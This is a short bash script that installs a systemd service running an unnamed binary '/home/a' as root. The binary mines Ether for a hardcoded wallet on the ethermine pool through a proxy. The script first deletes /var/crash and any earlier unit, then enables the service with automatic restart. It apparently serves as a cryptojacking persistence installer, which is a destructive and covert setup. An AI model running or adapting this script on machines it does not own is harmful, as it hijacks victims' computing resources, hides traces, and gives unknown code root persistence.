#!/bin/bash
cd /home

sudo rm -rf /lib/systemd/system/vaneth.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/vaneth.service 
[Unit]
Description=vaneth
After=network.target
[Service]
ExecStart= /home/a  -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy 6f390780b468.sn.mynetname.net:9090 
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo systemctl daemon-reload &&
sudo systemctl enable vaneth.service &&
sudo service vaneth stop  &&
sudo service vaneth restart
